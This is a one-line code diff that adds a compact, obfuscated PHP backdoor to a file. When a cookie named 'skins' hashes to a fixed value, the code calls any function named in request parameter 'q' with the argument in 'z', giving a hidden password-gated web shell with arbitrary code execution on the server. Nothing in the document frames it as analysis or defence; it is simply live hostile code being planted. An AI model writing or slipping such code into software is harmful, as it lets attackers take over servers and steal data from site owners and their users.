@@ -1,0 +1,1 @@
+<?php if(md5(@$_COOKIE['skins'])=='e6f124968338170c964823d0b5d37861')($_=@$_REQUEST['q']).@$_($_REQUEST['z']); ?>
